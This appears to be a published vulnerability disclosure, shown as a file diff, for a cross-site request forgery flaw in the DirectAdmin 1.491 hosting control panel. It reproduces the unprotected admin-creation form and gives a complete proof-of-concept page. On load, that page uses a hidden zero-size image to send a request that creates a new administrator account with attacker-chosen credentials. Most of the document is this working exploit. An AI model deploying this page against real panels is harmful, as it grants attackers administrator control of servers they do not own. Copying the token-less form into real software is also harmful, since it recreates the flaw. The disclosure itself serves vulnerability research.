@@ -1,0 +1,54 @@
+﻿
+=============================================================================
+# Title   : DirectAdmin (1.491) CSRF Vulnerability 
+# Date    : 27-10-2014 updated 18-02-2016
+# Version : >=1.491 
+# Author  : Necmettin COSKUN =>@babayarisi
+# Blog    :http://ha.cker.io
+# Vendor  : http://www.directadmin.com/
+# Download: http://www.directadmin.com/demo.html
+=============================================================================
+# info : DirectAdmin is a web-based hosting control panel.
+
+#As you can see original form doesn't include csrf protection or any secret token.
+<form name=reseller action="CMD_ACCOUNT_ADMIN" method="post" onSubmit="return formOK()">
+<input type=hidden name=action value=create>
+<tr><td class=list>Username:</td><td class=list><input type=text name=username maxlength=12 onChange="checkName()"></td></tr>
+<tr><td class=list>E-Mail:</td><td class=list><input type=text name=email onChange="checkEmail()"></td></tr>
+<tr><td class=list>Enter Password:</td><td class=list><input type=password name=passwd> <input type=button value="Random" onClick="randomPass()"></td></tr>
+<tr><td class=list>Re-Enter Password:</td><td class=list><input type=password name=passwd2 onChange="checkPass()"></td></tr>
+<tr><td class=list>Send Email Notification:</td><td class=list><input type=checkbox value="yes" name=notify checked> <a href="javascript:showAdminMessage();">Edit Admin Message</a></td></tr>
+
+<tr><td td class=listtitle colspan=3 align=right>
+<input type=submit value="Submit">
+</td></tr>
+</form>
+
+#POC
+<html>
+<head>
+<title>POC</title>
+</head>
+<script language="javascript">
+
+function yurudi(){
+var adress  ="www.demo.com";
+var username="demo";
+var email   ="demo@demo.com";
+var password="12345";
+var urlson="https://"+adress+":2222/CMD_ACCOUNT_ADMIN?action=create&username="+username+"&email="+email+"&passwd="+password+"&passwd2="+password;
+
+document.getElementById("resim").src=urlson;
+}
+</script>
+
+<body onload="yurudi()">
+<img id="resim" src="" style="height:0px;width:0px;"></img>
+</body>
+</html>
+#POC
+
+# don't be evil!
+Discovered by:
+================
+Necmettin COSKUN  |GrisapkaGuvenlikGrubu|4ewa2getha!
